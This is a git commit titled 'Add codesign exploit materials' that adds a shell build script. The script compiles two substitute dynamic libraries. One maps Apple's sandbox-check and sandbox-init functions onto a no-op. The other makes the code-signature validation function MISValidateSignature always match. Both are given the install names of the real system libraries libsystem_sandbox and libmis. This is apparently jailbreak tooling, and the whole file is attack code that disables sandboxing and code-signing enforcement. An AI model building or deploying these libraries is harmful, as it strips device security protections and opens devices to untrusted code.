dc2769e1afb4f3b1c742eb9ef75fb38eaaa2dc86
Egg <egg@Eggs-MacBook-Pro.local>
2016-08-01 14:37:13 -0700

    Add codesign exploit materials.

---
+++ codesign/compile.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+sandbox="-alias,_kCFBooleanTrue,_SANDBOX_CHECK_NO_REPORT,"
+sandbox+="-alias,_sync,_sandbox_check,"
+sandbox+="-alias,_sync,_sandbox_extension_consume,"
+sandbox+="-alias,_sync,_sandbox_extension_issue_file,"
+sandbox+="-alias,_sync,_sandbox_free_error,"
+sandbox+="-alias,_sync,_sandbox_init,"
+sandbox+="-alias,_sync,_sandbox_init_with_parameters"
+
+amfi="-alias,_CFEqual,_MISValidateSignature,"
+amfi+="-alias,_kCFUserNotificationTokenKey,_kMISValidationInfoEntitlements,"
+amfi+="-alias,_kCFUserNotificationTokenKey,_kMISValidationInfoSignerCertificate,"
+amfi+="-alias,_kCFUserNotificationTokenKey,_kMISValidationInfoSigningID,"
+amfi+="-alias,_kCFUserNotificationTokenKey,_kMISVlidationInfoValidatedByProfile,"
+amfi+="-alias,_kCFUserNotificationTokenKey,_kMISValidationOptionAllowAdHocSigning,"
+amfi+="-alias,_kCFUserNotificationTimeoutKey,_kMISValidationOptionExpectedHash,"
+amfi+="-alias,_kCFUserNotificationTokenKey,_kMISValidationOptionLogResourceErrors,"
+amfi+="-alias,_kCFUserNotificationTokenKey,_kMISValidationOptionUniversalFileOffset,"
+amfi+="-alias,_kCFUserNotificationTokenKey,_kMISValidationOptionValidateSignatureOnly"
+
+gcc -dynamiclib base.c -o sandbox.dylib -Wl,$sandbox -nostdlib -framework CoreFoundation -lm -install_name /usr/lib/libsystem_sandbox.dylib
+gcc -dynamiclib base.c -o amfi.dylib -Wl,$amfi -nostdlib -framework CoreFoundation -install_name /usr/lib/libmis.dylib
+
+echo "Compiled successfully!"
